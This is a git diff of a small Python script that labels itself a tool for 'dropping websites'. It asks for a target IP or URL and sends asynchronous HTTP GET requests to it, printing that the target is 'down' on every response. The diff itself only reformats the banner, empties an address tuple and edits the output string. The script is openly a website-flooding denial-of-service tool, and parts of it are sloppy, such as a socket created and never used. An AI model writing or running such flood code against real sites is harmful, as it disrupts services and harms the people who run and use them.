@@ -19,24 +19,24 @@ logo = """
      ±±   ±± ±±    ±±     ±±  ±±       ±±  ±±  ±±     ±±
        ±± ±±                  ±±       ±±
 _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__—_—_—_——_—_—_
-_— "\033[34m TOOLS TO DETECT AND DROPPING WEBSITES              \033[0m")         
-_— "\033[32m              DESIGN BY: KF24                       \033[0m")
-_— "\033[33m IF IN DOUBT OF ACCURACY, PLEASE HELP               \033[0m")
-_— "\033[91m            BY CHECKING THE HOST                    \033[0m")
-_— "\033[36m                  ——oO0Oo——                         \033[0m")
+_— "\033[34m        TOOLS TO DETECT AND DROPPING WEBSITES              \033[0m")         
+_— "\033[32m                     DESIGN BY: KF24                       \033[0m")
+_— "\033[33m        IF IN DOUBT OF ACCURACY, PLEASE HELP               \033[0m")
+_— "\033[91m                   BY CHECKING THE HOST                    \033[0m")
+_— "\033[36m                         ——oO0Oo——                         \033[0m")
 _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_
 """
 faded_text = fade.fire(logo)
 print(faded_text)
 socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-addr = (str(urk),int(GET))
+addr = (str(),int())
 ask = fade.pinkred("Enter the target IP/URL:")
 url = input(ask)
 async def increment_view_count(session):
     try:
         async with session.get(url) as response:
             if response.status == 200:
-                print("[+]  \033[32mRequest Sent \033[33m" +url+" down..!!  \033[0m")
+                print("[+]  \033[32mRequest Sent \033[33m" +url+" :::...\033[1mdown..!!  \033[0m")
             else:
                 print("[+]  \033[32mRequest Sent \033[33m" +url+" down..!!  \033[0m")
     except aiohttp.ClientError as e:
@@ -58,3 +58,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+    
